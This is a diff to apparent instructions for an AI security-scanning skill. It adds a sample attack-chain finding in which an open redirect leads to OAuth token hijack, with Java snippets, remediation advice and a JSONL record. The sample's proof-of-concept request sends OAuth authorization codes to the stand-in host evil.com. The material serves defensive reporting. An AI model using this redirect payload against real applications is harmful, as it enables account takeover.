@@ -114,21 +114,54 @@ Do not escalate when:
 
 ## Finding Format
 
-Emit findings using `.github/schemas/finding.schema.json`.
+Follow the canonical format from `copilot-instructions.md`. For chains, use `taint_path` to document each step with file and line evidence. Example:
 
-Use skill value: `sast-attack-chain`.
+```
+### [CRITICAL] Attack Chain — Open Redirect → OAuth Token Hijack
 
-Recommended ID prefix: `CHAIN-001`.
+**ID:** CHAIN-001
+**File:** `src/main/java/com/example/AuthController.java:78`
+**CWE:** CWE-601 | **OWASP:** A01:2021-Broken Access Control
+**CVSS (estimated):** 9.3 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)
+**Confidence:** High
+**Skill:** `sast-attack-chain`
 
-Use the CWE of the dominant root cause. Common choices:
+**Taint Path:**
+`Step 1: Attacker crafts OAuth login URL with returnTo=https://evil.com` → `AuthController.login(returnTo) (AuthController.java:78)` — open redirect (REDIRECT-001) → `Step 2: OAuth server redirects tokens to returnTo URL` → `AuthController.oauthCallback stores token in cookie (AuthController.java:112)` — token sent to attacker via redirect → `Step 3: Attacker replays token to access account`
 
-- `CWE-863` for authorization bypass chains
-- `CWE-918` for SSRF-led chains
-- `CWE-22` for traversal-led chains
-- `CWE-89` for SQLi-led chains
-- `CWE-200` for information exposure chains
+**Vulnerable Code:**
+```java
+// Step 1: Open redirect (AuthController.java:78)
+response.sendRedirect(returnTo);  // no host validation
 
-Set `taint_path` to include each chain step with file and line evidence.
+// Step 2: OAuth flow — redirect_uri derived from returnTo
+String redirectUri = buildRedirectUri(returnTo);  // (AuthController.java:95)
+oauthClient.authorize(redirectUri);
+```
+
+**Why Exploitable:**
+The open redirect (REDIRECT-001) allows an attacker to redirect the OAuth `redirect_uri` to their server. The OAuth server sends the authorization code to the attacker's URL, which can be exchanged for an access token giving full account control. Both steps are reachable from a single unauthenticated HTTP request.
+
+**Proof-of-Concept:**
+```http
+GET /login?returnTo=https://evil.com/capture HTTP/1.1
+# → OAuth redirects code to https://evil.com/capture?code=AUTH_CODE
+# → Attacker exchanges code for token at /oauth/token
+```
+
+**Remediation:**
+Fix the root cause (open redirect): validate `returnTo` against an allowlist of same-origin paths before using it as `redirect_uri`. Also register explicit `redirect_uri` values in the OAuth server configuration.
+
+**References:** https://cwe.mitre.org/data/definitions/601.html, OWASP A01:2021
+```
+
+Use skill value `sast-attack-chain`. Recommended ID prefix: `CHAIN-NNN`.
+Use the CWE of the dominant root cause: `CWE-863` (authz chains), `CWE-918` (SSRF chains), `CWE-22` (traversal chains), `CWE-89` (SQLi chains), `CWE-200` (info exposure chains).
+
+JSONL line (append to `.github/sast-findings.jsonl`):
+```json
+{"id":"CHAIN-001","skill":"sast-attack-chain","cwe":"CWE-601","owasp":"A01:2021-Broken Access Control","severity":"Critical","confidence":"High","file":"src/main/java/com/example/AuthController.java","line":78,"method":"login","class":"com.example.AuthController","evidence":"response.sendRedirect(returnTo);","sink":"OAuth token delivered to attacker-controlled redirect_uri","source":"GET /login?returnTo= (unauthenticated)","taint_path":[{"step":"Open redirect allows attacker-controlled redirect_uri","file":"src/main/java/com/example/AuthController.java","line":78},{"step":"OAuth server sends auth code to attacker URL","file":"src/main/java/com/example/AuthController.java","line":95}],"sanitizer_present":false,"sanitizer_detail":"","remediation":"Validate returnTo against same-origin allowlist before using as OAuth redirect_uri; register explicit redirect URIs in OAuth config","references":["https://cwe.mitre.org/data/definitions/601.html"],"false_positive_indicators":["OAuth server enforces strict redirect_uri allowlist independently"],"duplicate_of":null}
+```
 
 ---
 
